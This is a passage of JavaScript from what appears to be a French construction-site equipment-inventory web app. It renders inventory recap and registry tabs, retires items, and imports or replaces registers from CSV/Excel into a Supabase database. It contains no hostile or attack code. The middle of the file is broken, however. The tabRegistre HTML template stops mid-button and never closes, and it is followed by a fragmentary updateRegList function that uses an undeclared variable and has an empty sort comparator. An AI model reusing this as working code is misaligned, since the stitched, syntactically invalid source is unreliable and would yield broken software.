      ${S.role==='chef_chantier'||S.role==='admin'?`<div class="tab${S.tab==='finances'?' on':''}" data-tab="finances" onclick="setTab('finances')">💰 Finances</div>`:''}
      ${S.role==='chef'?`<div class="tab${S.tab==='infos'?' on':''}" data-tab="infos" onclick="setTab('infos')">Infos</div>`:''}
    </div>
    <div id="tab-content" style="overflow-y:auto;flex:1;padding-bottom:80px"></div>
    ${S.modal?renderModal():''}
    ${S.tab==='registre'&&(S.role==='chef'||S.role==='chef_chantier')?`<button class="fab" onclick="go('ajout_mat')"><svg viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>`:''}
  `;

  renderTab();
  if(S.modal)setTimeout(bindModal,0);
}
function setTab(t){S.tab=t;
  // Bloquer silentSync pendant la tournée CTE
  window._tourneeEnCours=(t==='tournee');
  renderTab();/* refresh tab styles */document.querySelectorAll('.tab').forEach(el=>el.classList.toggle('on',el.dataset.tab===t));/* refresh fab */const fab=document.querySelector('.fab');if(fab)fab.style.display=(t==='registre'&&S.role==='chef')?'flex':'none';}

function renderTab(){
  const el=document.getElementById('tab-content');if(!el)return;
  if(S.tab==='registre') S.role==='chef_chantier'?tabRecapChefChantier(el):tabRegistre(el);
  else if(S.tab==='tournee') tabTournee(el);
  else if(S.tab==='verifs') tabVerifs(el);
  else if(S.tab==='controle') tabControle(el);
  else if(S.tab==='finances') tabFinances(el);
  else if(S.tab==='infos') tabInfos(el);
}

// ─── RÉCAP INVENTAIRE CHEF CHANTIER ──
function tabRecapChefChantier(el){
  const c=getC(S.curC);
  const mats=matOfC(S.curC);
  const wk=getWeekKey();
  const d2m=60*24*60*60*1000;

  const total=mats.length;
  const confirms=mats.filter(m=>m.presence==='confirme').length;
  const absents=mats.filter(m=>m.presence==='absent').length;
  const nc=mats.filter(m=>m.presence==='non-confirme').length;
  const bons=mats.filter(m=>m.etat==='bon').length;
  const acceptables=mats.filter(m=>m.etat==='acceptable').length;
  const degrades=mats.filter(m=>m.etat==='degrade').length;
  const hs=mats.filter(m=>m.etat==='hors-service').length;
  const inconnus=mats.filter(m=>m.etat==='inconnu').length;
  const v1done=mats.filter(m=>getVerif(m,'lundi')).length;
  const v2done=mats.filter(m=>getVerif(m,'semaine')).length;
  const done=mats.filter(m=>getVerif(m,'lundi')||getVerif(m,'semaine')).length;
  const retard=mats.filter(m=>!m.controle2m||(new Date()-new Date(m.controle2m.date))>d2m).length;

  const invPct=total?Math.round(confirms/total*100):0;
  const confPct=total?Math.round(bons/total*100):0;
  const v1Pct=total?Math.round(v1done/total*100):0;
  const v2Pct=total?Math.round(v2done/total*100):0;

  const statLine=(label,val,col)=>`
    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:.5px solid var(--border)">
      <span style="font-size:13px;color:var(--text2)">${label}</span>
      <span style="font-size:15px;font-weight:700;color:${col}">${val}</span>
    </div>`;

  const progBar=(pct,col)=>`
    <div style="display:flex;align-items:center;gap:8px;margin-top:4px">
      <div style="flex:1;height:6px;background:var(--bg3);border-radius:3px;overflow:hidden">
        <div style="height:6px;width:${pct}%;background:${col};border-radius:3px"></div>
      </div>
      <span style="font-size:12px;font-weight:700;color:${col};min-width:32px;text-align:right">${pct}%</span>
    </div>`;

  el.innerHTML=`
    <div style="padding:12px 16px 80px;display:flex;flex-direction:column;gap:10px">

      ${absents?`<div class="alert-box a-danger"><span style="font-size:16px;color:#F09595">⚠</span><span class="at"><strong>${absents} article(s) absent(s)</strong> — action requise</span></div>`:''}

      <!-- Inventaire -->
      <div class="card">
        <div style="font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px">Inventaire</div>
        ${progBar(invPct, invPct>=80?'#3db54a':invPct>=50?'#f5a623':'#e24b4a')}
        <div style="margin-top:8px">
          ${statLine('Confirmés',confirms,'#3db54a')}
          ${statLine('Non confirmés',nc,'#f5a623')}
          ${statLine('Absents',absents,absents?'#F09595':'var(--text3)')}
          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0">
            <span style="font-size:13px;color:var(--text2)">Total</span>
            <span style="font-size:15px;font-weight:700;color:var(--text)">${total}</span>
          </div>
        </div>
      </div>

      <!-- État du matériel -->
      <div class="card">
        <div style="font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px">État du matériel</div>
        ${progBar(confPct, confPct>=80?'#3db54a':confPct>=50?'#f5a623':'#e24b4a')}
        <div style="margin-top:8px">
          ${statLine('Bon état',bons,'#3db54a')}
          ${statLine('Acceptable',acceptables,'#f5a623')}
          ${statLine('Dégradé',degrades,degrades?'var(--accent)':'var(--text3)')}
          ${statLine('Hors service',hs,hs?'#F09595':'var(--text3)')}
          ${statLine('Non inspecté',inconnus,'var(--text3)')}
        </div>
      </div>

      <!-- Suivi hebdomadaire -->
      <div class="card">
        <div style="font-size:11px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:10px">Vérifications — semaine ${wk}</div>
        <!-- Vérif 1 début de semaine -->
        <div style="margin-bottom:10px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px">
            <span style="font-size:12px;color:var(--text2)">🔵 Vérif 1 — début de semaine</span>
            <span style="font-size:13px;font-weight:700;color:${v1Pct>=80?'#3db54a':v1Pct>=50?'#f5a623':'#e24b4a'}">${v1done}/${total}</span>
          </div>
          ${progBar(v1Pct, v1Pct>=80?'#3db54a':v1Pct>=50?'#f5a623':'#e24b4a')}
          <div style="font-size:11px;color:var(--text3);margin-top:3px">${total-v1done} article(s) sans vérif 1</div>
        </div>
        <!-- Vérif 2 fin de semaine -->
        <div style="padding-top:8px;border-top:.5px solid var(--border)">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px">
            <span style="font-size:12px;color:var(--text2)">🟣 Vérif 2 — fin de semaine</span>
            <span style="font-size:13px;font-weight:700;color:${v2Pct>=80?'#3db54a':v2Pct>=50?'#f5a623':'#e24b4a'}">${v2done}/${total}</span>
          </div>
          ${progBar(v2Pct, v2Pct>=80?'#3db54a':v2Pct>=50?'#f5a623':'#e24b4a')}
          <div style="font-size:11px;color:var(--text3);margin-top:3px">${total-v2done} article(s) sans vérif 2</div>
        </div>
        <div style="margin-top:10px;padding-top:8px;border-top:.5px solid var(--border)">
          ${statLine('Contrôles 2 mois en retard',retard,retard?'#F09595':'#3db54a')}
        </div>
      </div>

    </div>`;
}

// ─── ONGLET REGISTRE ─────────────────
function tabRegistre(el){
  const c=getC(S.curC);
  const mats=matOfC(S.curC);
  const ab=mats.filter(m=>m.presence==='absent').length;
  const nc=mats.filter(m=>m.presence==='non-confirme').length;

  const filtres=[
    {k:'tous',l:`Tous (${mats.length})`},
    {k:'confirme',l:`Présents (${mats.filter(m=>m.presence==='confirme').length})`},
    {k:'non-confirme',l:`Non conf. (${nc})`},
    {k:'absent',l:`Absents (${ab})`},
    {k:'retire',l:`Retirés (${mats.filter(m=>m.presence==='retire').length})`},
  ];

  let filtered=mats;
  if(S.searchReg){const q=S.searchReg.toLowerCase();filtered=filtered.filter(m=>m.nom.toLowerCase().includes(q)||m.id.toLowerCase().includes(q)||m.cat.toLowerCase().includes(q));}
  if(S.filterPres.size>0) filtered=filtered.filter(m=>S.filterPres.has(m.presence));
  if(S.filterCat.size>0) filtered=filtered.filter(m=>S.filterCat.has(m.cat));
  // Tri
  const etatOrder={bon:0,acceptable:1,degrade:2,'hors-service':3,inconnu:4};
  const presOrder={confirme:0,'non-confirme':1,absent:2,retire:3};
  filtered=[...filtered].sort((a,b)=>{
    // HS toujours en premier, kits incomplets en second
    const aHS=a.etat==='hors-service'?0:1;
    const bHS=b.etat==='hors-service'?0:1;
    if(aHS!==bHS) return aHS-bHS;
    const aKit=isKitIncomplet(a)?0:1;
    const bKit=isKitIncomplet(b)?0:1;
    if(aKit!==bKit) return aKit-bKit;
    if(S.sortReg==='nom') return a.nom.localeCompare(b.nom,'fr');
    if(S.sortReg==='etat') return (etatOrder[a.etat]??9)-(etatOrder[b.etat]??9);
    if(S.sortReg==='presence') return (presOrder[a.presence]??9)-(presOrder[b.presence]??9);
    if(S.sortReg==='scan') return (b.scan||'').localeCompare(a.scan||'');
    return 0;
  });

  const cats=['tous',...new Set(mats.map(m=>m.cat))];
  const selCount=S.selItems.size;

  el.innerHTML=`
    ${ab?`<div class="alert-box a-danger" style="margin-top:10px">
      <span style="font-size:18px;font-weight:700;color:#F09595">?</span>
      <span class="at"><strong>${ab} article(s) absent(s)</strong> — action requise</span>
    </div>`:''}
    ${nc?`<div class="alert-box a-warn" style="margin-top:6px">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/></svg>
      <span class="at">${nc} article(s) non confirmé(s)</span>
    </div>`:''}

    ${c.responsableSemaine?`<div style="margin:6px 16px 0;background:rgba(61,181,74,.08);border:.5px solid rgba(61,181,74,.25);border-radius:10px;padding:8px 12px;display:flex;align-items:center;gap:10px">
      <div style="width:28px;height:28px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;flex-shrink:0">${c.responsableSemaine.split(' ').map(n=>n[0]).join('').slice(0,2).toUpperCase()}</div>
      <div>
        <div style="font-size:10px;font-weight:600;color:var(--accent);text-transform:uppercase;letter-spacing:.06em">👤 Responsable inventaire</div>
        <div style="font-size:13px;font-weight:600;color:var(--text)">${c.responsableSemaine}</div>
      </div>
    </div>`:''}

    ${(()=>{
      const total=mats.filter(m=>m.presence!=='retire').length;
      if(!total) return '';
      const lundi=mats.filter(m=>getVerif(m,'lundi')).length;
      const semaine=mats.filter(m=>getVerif(m,'semaine')).length;
      const pctL=Math.round(lundi/total*100);
      const pctS=Math.round(semaine/total*100);
      return`<div style="margin:0 16px 8px;background:var(--bg3);border-radius:10px;padding:10px 12px;border:.5px solid var(--border)">
        <div style="font-size:11px;font-weight:600;color:var(--text);margin-bottom:8px">📋 Avancement inventaire</div>
        <div style="margin-bottom:6px">
          <div style="display:flex;justify-content:space-between;margin-bottom:3px">
            <span style="font-size:11px;color:var(--text2)">Vérif lundi</span>
            <span style="font-size:11px;font-weight:600;color:${pctL===100?'#3db54a':pctL>50?'#f5a623':'#F09595'}">${lundi}/${total} — ${pctL}%</span>
          </div>
          <div style="height:5px;background:var(--border);border-radius:3px;overflow:hidden">
            <div style="height:100%;width:${pctL}%;background:${pctL===100?'#3db54a':pctL>50?'#f5a623':'#F09595'};border-radius:3px"></div>
          </div>
        </div>
        <div>
          <div style="display:flex;justify-content:space-between;margin-bottom:3px">
            <span style="font-size:11px;color:var(--text2)">Vérif semaine</span>
            <span style="font-size:11px;font-weight:600;color:${pctS===100?'#3db54a':pctS>50?'#f5a623':'#F09595'}">${semaine}/${total} — ${pctS}%</span>
          </div>
          <div style="height:5px;background:var(--border);border-radius:3px;overflow:hidden">
            <div style="height:100%;width:${pctS}%;background:${pctS===100?'#3db54a':pctS>50?'#f5a623':'#F09595'};border-radius:3px"></div>
          </div>
        </div>
      </div>`;
    })()}

    <!-- Barre de recherche -->
    <div style="padding:8px 16px 0;display:flex;align-items:center;gap:8px">
      <div style="flex:1;position:relative">
        <svg style="position:absolute;left:10px;top:50%;transform:translateY(-50%);pointer-events:none" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text3)" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <input id="reg-search" class="fi" placeholder="Rechercher un article, ID, catégorie…" value="${S.searchReg}"
          style="padding-left:32px;padding-right:${S.searchReg?'32px':'12px'};font-size:13px" inputmode="text"
          oninput="S.searchReg=this.value;updateRegList()" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
        ${S.searchReg?`<button onclick="S.searchReg='';renderTab()" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text3);padding:2px;display:flex">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>`:''}
      </div>
    </div>
    <!-- Filtres présence uniquement -->
    <div class="chips" style="flex-wrap:wrap;gap:6px;padding:10px 16px 4px">
      ${filtres.filter(f=>f.k!=='tous').map(f=>`<div class="chip${S.filterPres.has(f.k)?' on':''}" onclick="setFP('${f.k}')">${f.l}</div>`).join('')}
      ${S.filterPres.size>0?`<div class="chip" onclick="resetFiltres()" style="opacity:.55;border-color:rgba(255,255,255,.1)">✕ Effacer</div>`:''}
    </div>
    <!-- Barre de tri -->
    <div style="padding:0 16px 6px;display:flex;align-items:center;gap:6px">
      <span style="font-size:10px;color:var(--text3);flex-shrink:0">Trier :</span>
      ${[{k:'nom',l:'Nom'},{k:'etat',l:'État'},{k:'presence',l:'Présence'},{k:'scan',l:'Dernier scan'}].map(t=>`<div onclick="S.sortReg='${t.k}';renderTab()" style="font-size:10px;padding:3px 10px;border-radius:20px;cursor:pointer;border:.5px solid ${S.sortReg===t.k?'var(--accent)':'var(--border)'};background:${S.sortReg===t.k?'var(--accent)':'var(--bg3)'};color:${S.sortReg===t.k?'#1a0a00':'var(--text2)'};white-space:nowrap;flex-shrink:0">${t.l}</div>`).join('')}
    </div>

    <div style="padding:10px 16px 20px">
      ${(S.role==='chef'||S.role==='chef_chantier')?`
      <!-- Barre d'actions chef -->
      <div style="display:flex;gap:8px;margin-bottom:10px">
        <button onclick="go('ajout_mat')" style="flex:1;background:var(--bg3);border:.5px solid var(--border);border-radius:10px;padding:9px 8px;font-size:12px;color:var(--text2);cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Ajouter
        </button>
        <button onclick="openImportChoix()" style="flex:1;background:rgba(55,138,221,.1);border:.5px solid rgba(55,138,221,.3);border-radius:10px;padding:9px 8px;font-size:12px;color:#85B7EB;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Importer
        </button>
        <button onclick="toggleSelMode()" style="flex:1;background:${S.selMode?'rgba(61,181,74,.15)':'var(--bg3)'};border:.5px solid ${S.selMode?'rgba(61,181,74,.4)':'var(--border)'};border-radius:10px;padding:9px 8px;font-size:12px;color:${S.selMode?'var(--accent)':'var(--text2)'};cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 11 12 14 22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>${S.selMode?'Annuler':'Sélectionner'}
        </button>
        ${['chef','chef_chantier'].includes(S.role)?`<button onclick="openExportChoix()" style="flex:1;background:rgba(29,158,117,.08);border:.5px solid rgba(29,158,117,.2);border-radius:10px;padding:9px 8px;font-size:12px;color:#5DCAA5;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#5DCAA5" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>Exporter

function updateRegList(){

  if(S.filterPres.size>0) filtered=filtered.filter(m=>S.filterPres.has(m.presence));
  filtered=[...filtered].sort((a,b)=>{
    const aHS=a.etat==='hors-service'?0:1;

  });

async function doRetirer(id,motifRetrait,prixUnitaire){
  window._importing=true;
  try{
    const idx=S.mat.findIndex(m=>m.id===id);
    if(idx!==-1){
      S.mat[idx].presence='retire';
      S.mat[idx].motifRetrait=motifRetrait||'fin_de_vie';
      if(prixUnitaire>0) S.mat[idx].prixUnitaire=prixUnitaire;
    }
    S.scans=S.scans.filter(s=>s.materielId!==id);
    try{localStorage.setItem('ro3_m',JSON.stringify(S.mat));}catch(e){}
    queueDelete(id);
    try{
      const updateData={presence:'retire',motifRetrait:motifRetrait||'fin_de_vie'};
      if(prixUnitaire>0) updateData.prixUnitaire=prixUnitaire;
      const {error}=await db.from('materiels').update(updateData).eq('id',id);
      if(!error){
        dequeueDelete(id);
      } else {
        console.warn('[doRetirer] Update failed, trying delete:',error.message);
        const ok=await safeDeleteMat(id);
        if(ok){
          try{await db.from('scans').delete().eq('materielId',id);}catch(e){}
          try{await db.from('deleted_ids').insert({identifiant:id});}catch(e){console.warn('[deleted_ids insert]',e.message);}
          dequeueDelete(id);
        }
      }
    }catch(e){console.warn('[doRetirer] Offline, mis en queue:',id);}
    S.modal=null;S.modalData=null;
    renderChantierDetail();
    setTimeout(()=>toast('Article retiré du chantier','warn'),80);
  }finally{
    window._importing=false;
    window._lastImport=Date.now();
  }
}

const SKIP_TABS=['SAISIE','TRANSFERT','RETOUR','SAISIE PERTE-VOL','TABLEAU DE BORD','INVENTAIRE','ALERTES','REFS_LISTE','RETOURS','RECAP','RECAPITULATIF','SYNTHESE','SYNTHÈSE','LISTE','REFERENCES','RÉFÉRENCES','MODELE','MODÈLE','TEMPLATE'];

function triggerImport(){document.getElementById('csv-input')?.click();}
function triggerReplace(){document.getElementById('csv-replace-input')?.click();}

function importReplace(input){
  const file=input.files[0];if(!file)return;
  const ext=file.name.split('.').pop().toLowerCase();
  input.value='';
  const doReplace=(rows, targetChantierId=S.curC, allowTransfer=true)=>{
    window._importing=true;
    const firstCell=String(rows[0][0]||'').trim();
    const looksLikeData=/^\d+[\-\/\.]/.test(firstCell)||/^[A-Za-z]{1,6}\d/.test(firstCell)||/^[A-Za-z]{1,6}-\d/.test(firstCell);
    const hasHeader=!looksLikeData&&rows.length>=2;
    const norm=s=>String(s||'').trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/['"]/g,'');

    // Détecter colonnes
    let iId=0,iNom=0,iDate=-1,iPrix=-1;
    if(hasHeader){
      const headers=rows[0].map(h=>norm(h));
      const foundId=headers.findIndex(h=>h==='id'||h==='ref'||h==='reference'||h.includes('ref')||h.includes('code')||h.includes('num')||h.includes('serie'));
      const foundNom=headers.findIndex(h=>h.includes('design')||h.includes('libel')||h.includes('nom')||h.includes('article'));
      const foundDate=headers.findIndex(h=>h.includes('date')||h.includes('verif')||h.includes('echeance')||h.includes('valid'));
      const foundPrix=headers.findIndex(h=>h.includes('prix')||h.includes('cout')||h.includes('valeur')||h.includes('tarif')||h==='eur'||h==='euro');
      if(foundId!==-1) iId=foundId;
      iNom=foundNom!==-1?foundNom:iId;
      iDate=foundDate;
      iPrix=foundPrix;
    } else {
      iId=0;iNom=0;iDate=1;
    }
    const startRow=hasHeader?1:0;

    // Extraire les IDs du nouveau fichier
    const newIds=new Set();
    const newRows=[];
    for(let i=startRow;i<rows.length;i++){
      const raw=rows[i][iId];if(!raw)continue;
      const id=String(raw).trim().replace(/\s/g,'').replace(/[*\\#?&'"]/g,'-');
      if(id){newIds.add(id);newRows.push({id,row:rows[i]});}
    }

    // Sauvegarder les vérifs de la semaine courante avant suppression
    const wkNow=getWeekKey();
    const verifsToKeep={};
    S.mat.filter(m=>m.chantierId===targetChantierId&&newIds.has(m.id)).forEach(m=>{
      // Article qui reste dans le nouveau registre → conserver ses vérifs
      if(m.verifLundi?.weekKey===wkNow||m.verifSemaine?.weekKey===wkNow){
        verifsToKeep[m.id]={verifLundi:m.verifLundi,verifSemaine:m.verifSemaine};
      }
    });

    // Supprimer articles absents
    const avant=S.mat.filter(m=>m.chantierId===targetChantierId).length;
    const suppIds=S.mat.filter(m=>m.chantierId===targetChantierId&&!newIds.has(m.id)).map(m=>m.id);
    S.mat=S.mat.filter(m=>!(m.chantierId===targetChantierId&&!newIds.has(m.id)));
    S.scans=S.scans.filter(s=>!suppIds.includes(s.materielId));

    // Traiter chaque ligne : mise à jour ou ajout
    let added=0,updated=0;
    const toUpsert=[];
    for(const {id,row} of newRows){
      const nom=String(row[iNom]||'').trim()||id;
      // Échéance
      let echeance='';
      if(iDate>=0&&row[iDate]!==undefined&&row[iDate]!==''){
        const raw=row[iDate];
        if(typeof raw==='number'&&raw>1000){
          const d=new Date(new Date(1899,11,30).getTime()+raw*86400000);
          echeance=d.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
        } else echeance=String(raw).trim();
      }
      const existingIdx=S.mat.findIndex(m=>m.id===id);
      // Prix
      let prix=null;
      if(iPrix>=0&&row[iPrix]!==undefined&&row[iPrix]!==''){
        const p=parseFloat(String(row[iPrix]).replace(/[^\d.,]/g,'').replace(',','.'));
        if(!isNaN(p)) prix=p;
      }
      if(existingIdx!==-1){
        if(echeance) S.mat[existingIdx].echeance=echeance;
        if(prix!==null) S.mat[existingIdx].prix=prix;
        // Rattacher au bon chantier si nécessaire
        if(S.mat[existingIdx].chantierId!==targetChantierId){
          if(allowTransfer){
            // Remplacer feuille unique → transfert autorisé, noter l'ancien chantier pour le badge
            const ancienChantierId=S.mat[existingIdx].chantierId;
            saveMultiChantier(id,[targetChantierId,ancienChantierId]);
            S.mat[existingIdx].chantierId=targetChantierId;
            S.mat[existingIdx].presence='non-confirme';
            S.mat[existingIdx].etat='inconnu';
            S.mat[existingIdx].scan=null;
            S.mat[existingIdx].verifLundi=null;
            S.mat[existingIdx].verifSemaine=null;
            S.mat[existingIdx].controle2m=null;
            S.mat[existingIdx].autreChantier=ancienChantierId;
          } else {
            // Remplacer multi-feuilles → transfert bloqué, article affiché comme ref externe
            saveMultiChantier(id,[S.mat[existingIdx].chantierId,targetChantierId]);
            S.mat[existingIdx].autreChantier=targetChantierId;
            // Stocker comme référence externe dans ce chantier
            try{
              const extMap=JSON.parse(localStorage.getItem('ro3_ext')||'{}');
              extMap[targetChantierId]=extMap[targetChantierId]||[];
              if(!extMap[targetChantierId].includes(id)) extMap[targetChantierId].push(id);
              localStorage.setItem('ro3_ext',JSON.stringify(extMap));
            }catch(e){}
            console.warn('[Remplacer] Ref externe ajoutée:',id,'→',targetChantierId,'(propriétaire:',S.mat[existingIdx].chantierId,')');
            updated++;
            toUpsert.push(S.mat[existingIdx]);
            continue;
          }
        }
        toUpsert.push(S.mat[existingIdx]);
        updated++;
      } else {
        // Auto-catégorie
        let cat='Outillage';
        const newMat={id,nom,cat,chantierId:targetChantierId,etat:'inconnu',scan:null,presence:'non-confirme',echeance,prix};
        S.mat.push(newMat);
        toUpsert.push(newMat);
        added++;
      }
    }

    // Réappliquer les vérifs conservées sur les articles qui existent toujours
    if(Object.keys(verifsToKeep).length){
      Object.entries(verifsToKeep).forEach(([id,v])=>{
        const idx=S.mat.findIndex(m=>m.id===id);
        if(idx!==-1){
          S.mat[idx].verifLundi=v.verifLundi;
          S.mat[idx].verifSemaine=v.verifSemaine;
        }
      });
    }

    // Sauvegarder
    try{localStorage.setItem('ro3_m',JSON.stringify(S.mat));}catch(e){}

    // Nettoyer ro3_ext : supprimer les IDs retirés du registre
    try{
      const extMap=JSON.parse(localStorage.getItem('ro3_ext')||'{}');
      // Garder uniquement les IDs qui existent encore dans S.mat
      const validIds=new Set(S.mat.map(m=>m.id));
      Object.keys(extMap).forEach(cid=>{
        extMap[cid]=extMap[cid].filter(id=>validIds.has(id)&&newIds.has(id));
        if(!extMap[cid].length) delete extMap[cid];
      });
      localStorage.setItem('ro3_ext',JSON.stringify(extMap));
    }catch(e){}

    // Nettoyer ro3_mc pour les articles supprimés
    try{
      const mcMap=JSON.parse(localStorage.getItem('ro3_mc')||'{}');
      suppIds.forEach(id=>delete mcMap[id]);
      localStorage.setItem('ro3_mc',JSON.stringify(mcMap));
    }catch(e){}

    // Supabase : deletes + upserts séquentiels (évite la race condition avec silentSync)
    (async()=>{
      // 1. Supprimer les articles absents du nouveau registre (en lot)
      if(suppIds.length){
        const DEL_CHUNK=100;
        for(let i=0;i<suppIds.length;i+=DEL_CHUNK){
          const batch=suppIds.slice(i,i+DEL_CHUNK);
          const {error:ed}=await db.from('materiels').delete().filter('id','in','('+batch.map(i=>`"${i}"`).join(',')+')');
          if(ed) console.warn('[Remplacer] Erreur delete:',ed.message);
          else console.log('[Remplacer] Supprimé',batch.length,'articles ✓');
          await db.from('scans').delete().in('materielId',batch).catch(e=>console.warn('delete scans:',e));
        }
        try{await db.from('deleted_ids').insert(suppIds.map(id=>({identifiant:id})));}catch(e){console.warn('[deleted_ids bulk]',e.message);}
      }
      // 2. Upsert les articles mis à jour/ajoutés
      if(toUpsert.length){
        const forDB=toUpsert.map(({prix:_,autreChantier:__,...m})=>m);
        console.log('[Remplacer] Upsert',forDB.length,'articles → chantierId:',targetChantierId);
        const CHUNK=100;
        for(let i=0;i<forDB.length;i+=CHUNK){
          const chunk=forDB.slice(i,i+CHUNK);
          const {error}=await db.from('materiels').upsert(chunk,{onConflict:'id'});
          if(error){console.error('[Remplacer] ERREUR chunk',i,error.message);toast('Erreur upsert : '+error.message,'danger');}
          else console.log('[Remplacer] Chunk',i,'→',i+chunk.length,'✓');
        }
      }
      window._importing=false;
    })();

    renderTab();
    toast(suppIds.length+' supprimé(s) · '+added+' ajouté(s) · '+updated+' mis à jour','ok');
  };
  if(ext==='xlsx'||ext==='xls'||ext==='xlsm'){
    if(typeof XLSX==='undefined'){toast('Librairie Excel non chargée','danger');return;}
    const reader=new FileReader();
    reader.onload=function(e){
      try{
        const wb=XLSX.read(e.target.result,{type:'array'});
        // Filtrer les onglets utilitaires
        const sheets=wb.SheetNames.filter(sn=>{
          if(SKIP_TABS.includes(sn.toUpperCase().trim())) return false;
          const rows=XLSX.utils.sheet_to_json(wb.Sheets[sn],{header:1,defval:''});
          return rows.filter(r=>r.some(c=>String(c||'').trim())).length>=2;
        });
        if(!sheets.length){toast('Aucune feuille de données trouvée','danger');return;}
        if(sheets.length===1){
          // Feuille unique → remplace le chantier courant
          const rows=XLSX.utils.sheet_to_json(wb.Sheets[sheets[0]],{header:1,defval:''});
          doReplace(rows.filter(r=>r.some(c=>String(c||'').trim())));
          return;
        }
        // Multi-feuilles → traitement automatique sans modale
        const normStr=s=>String(s||'').trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'');
        let totalSupp=0,totalAdded=0,totalUpdated=0,matched=0,skipped=[];
        (async()=>{
          window._importing=true;
          window._lastImport=Date.now();
          try{
            for(const sn of sheets){
              const snNorm=normStr(sn);
              const chantier=S.chantiers.find(c=>
                normStr(c.nom)===snNorm||
                normStr(c.nom).includes(snNorm)||
                snNorm.includes(normStr(c.nom))
              );
              if(!chantier){skipped.push(sn);console.warn('[Remplacer] Aucun chantier pour onglet:',sn);continue;}
              const rows=XLSX.utils.sheet_to_json(wb.Sheets[sn],{header:1,defval:''});
              const ne=rows.filter(r=>r.some(c=>String(c||'').trim()));
              console.log('[Remplacer]',sn,'→',chantier.nom,'(',ne.length,'lignes)');
              const matBefore=S.mat.filter(m=>m.chantierId===chantier.id).length;
              doReplace(ne, chantier.id, false);
              matched++;
              await new Promise(r=>setTimeout(r,200));
            }
            const skipMsg=skipped.length?' · '+skipped.length+' onglet(s) sans chantier : '+skipped.join(', '):'';
            toast(matched+' chantier(s) mis à jour'+skipMsg,'ok');
            render();
          }finally{
            window._importing=false;
          }
        })();
      }catch(err){toast('Erreur lecture Excel : '+err.message,'danger');}
    };
    reader.readAsArrayBuffer(file);
  } else {
    const reader=new FileReader();
    reader.onload=function(e){
      const lines=e.target.result.split(/\r?\n/).filter(l=>l.trim());
      const sep=lines[0]?.includes(';')?';':',';
      doReplace(lines.map(l=>l.split(sep).map(c=>c.replace(/^"|"$/g,'').trim())));
    };
    reader.readAsText(file,'utf-8');
  }
}

async function processRows(rows){
  window._lastImport = Date.now();
  window._importing = true; // bloquer silentSync pendant tout l'import
  if(!rows||rows.length<1){window._importing=false;toast('Fichier vide','danger');return;}

  // ── Détection en-tête ──
  // Une référence matériel commence par 1-6 lettres ASCII puis un chiffre (CLR95, RI0, D15)
  // ou par 1-6 lettres puis tiret+chiffre (PI-0868, RPIR-2404)
  // ou par des chiffres puis tiret (6011-134)
  // Un en-tête contient des lettres accentuées (é, è, à...) qui cassent la séquence [A-Za-z]
  const firstCell = String(rows[0][0]||'').trim();
  const looksLikeData =
    /^\d+[\-\/\.]/.test(firstCell) ||          // 6011-134
    /^[A-Za-z]{1,6}\d/.test(firstCell) ||      // CLR95, CV95, D15, RI0, Pulsar133
    /^[A-Za-z]{1,6}-\d/.test(firstCell);       // PI-0868, RPIR-2404
  const hasHeader = !looksLikeData && rows.length >= 2;

  // ── Normalisation : minuscules + suppression accents ──
  const norm = s => String(s||'').trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/['"]/g,'');

  let iNom=-1, iCat=-1, iId=-1, iEtat=-1, iDate=-1, iPrix=-1;

  if(hasHeader){
    const headers = rows[0].map(h=>norm(h));
    iId   = headers.findIndex(h=>h==='id'||h==='ref'||h==='reference'||h.includes('ref')||h.includes('code')||h.includes('num')||h.includes('serie'));
